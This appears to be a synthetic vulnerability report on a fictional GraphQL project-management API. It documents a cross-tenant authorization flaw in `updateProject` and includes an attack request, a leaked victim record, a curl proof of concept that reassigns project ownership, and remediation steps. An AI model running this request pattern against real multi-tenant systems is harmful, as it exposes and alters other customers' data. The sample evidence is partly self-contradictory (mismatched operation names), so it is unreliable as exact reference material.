# Security Analysis Report
**System:** TaskFlow Collaboration API
**Domain:** SaaS / Project Management
**Example ID:** GQL-0310
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.2 | Related/linked resource access on `updateProject` — attacker accesses and modifies cross-tenant project records linked to victim's project management data |

---

## Finding 1 — BOLA: Related/Linked Resource Access on Project Object (Pattern 1.2)

### Summary
The `updateProject` resolver on TaskFlow Collaboration API (`api.taskflow-collaborati.example.com`) accepts a project `id` parameter without verifying the fetched object's `tenantId` against the JWT's `tenantId` (RISK-GQL-310). Per §5.0 Pattern 1.2, the resolver does not enforce ownership or tenancy boundaries on linked resources — an attacker can access related project data (tasks, linked resources) belonging to `tenant-cf40` using a token for `tenant-ffdb`. The client-supplied `ownerId` in the mutation input further enables unauthorized ownership reassignment of victim project records.

**Context.txt inconsistency (documented):** HAR mutation uses `updateProject(id: "P-2310", input: {status: "approved", ownerId: "attacker-ffdbcf40"})`, but the response key in §6.0 is `getProject`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`updateProject`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `projectId` only (no user/tenant dimension), enabling cross-tenant cache poisoning.

**Pattern:** 1.2 — Related or linked resources (BOLA)
**Affected resolver:** `updateProject`
**Affected endpoint:** `POST https://api.taskflow-collaborati.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.taskflow-collaborati.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-ffdb

{"query": "query VulnerableOp { updateProject(id: \"P-2310\", input: {status: \"approved\", ownerId: \"attacker-ffdbcf40\"}) { projectId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Project Record Returned (cross-tenant)**
```json
{
  "data": {
    "getProject": {
      "tenantId": "tenant-cf40",
      "ownerId": "other-user-ffdbcf40",
      "data": {
        "sensitiveField": "CONFIDENTIAL-ffdbcf40",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-ffdb`. Returned/mutated data belongs to: `tenant-cf40`. Cross-tenant project data access and modification confirmed.

**Context.txt inconsistency:** HAR sends `updateProject` mutation; response body uses key `getProject`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.taskflow-collaborati.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-ffdb" \
  -d '{"query": "query VulnerableOp { updateProject(id: \"P-2310\", input: {status: \"approved\", ownerId: \"attacker-ffdbcf40\"}) { projectId status } }"}'
# Vulnerable: response contains tenant-cf40 project data — cross-tenant mutation succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `updateProject` resolver: before mutation, assert `fetched.tenantId === jwt.tenantId`. Return 403 on mismatch.
2. Reject client-supplied `ownerId` in mutation input; derive from JWT `sub`.
3. Ensure all linked resources (tasks, children) also enforce `tenantId` boundary — traverse-related resources must re-validate authorization at each level.
4. Re-key Redis cache to include `tenantId` (e.g., `tenant:{tenantId}:project:{projectId}`).
